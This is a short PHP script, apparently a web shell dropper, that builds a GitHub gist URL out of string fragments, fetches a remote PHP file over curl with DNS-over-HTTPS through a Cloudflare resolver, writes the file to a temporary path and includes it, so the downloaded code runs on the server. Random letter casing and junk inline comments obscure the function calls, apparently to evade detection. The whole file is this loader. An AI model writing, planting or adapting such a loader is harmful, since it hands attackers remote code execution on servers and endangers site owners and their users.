<?php
$url = "https://gi";
$url .= "st.githubu";
$url .= "sercontent";
$url .= ".com/rafae";
$url .= "yfa1337/aa";
$url .= "77207a4d04";
$url .= "f96e8cfd3a";
$url .= "f3dc9d2be3";
$url .= "/raw/b9708";
$url .= "17c8820c93";
$url .= "deb0e5c7ef";
$url .= "86938f4e21";
$url .= "da184/0xRa";
$url .= "faeyfa.php";
$dns = 'ht';
$dns .= 'tps:/';
$dns .= '/cloud';
$dns .= 'flare-';
$dns .= 'dns.c';
$dns .= 'om/dns';
$dns .= '-query';

$ch = CurL_init /* 767n90 */($url);

if (defined('CURLOPT_DOH_URL')) {
    curL_setOPT($ch, CURLOPT_DOH_URL, $dns);
}
cUrl_setOpt/* d4564*/($ch, CURLOPT_RETURNTRANSFER, TRUE);
Curl_seTOPt/* d2345 */($ch, CURLOPT_SSL_VERIFYHOST, 2); 
curL_seTopt /* *//* 678in */($ch, CURLOPT_SSL_VERIFYPEER, true);
$res = curl_ExEC/* 7568 */($ch);
cuRl_close/* c34 */($ch);

$tmp = TMPfIle/* h7n89o */();
$path = streaM_Get_meTa_daTa/* 345 */($tmp);
$path = $path/* r23 */ ['uri'];
fprintf/* 3d45 */($tmp,'%s',$res);
IncLude/* 23x4 *//* */($path);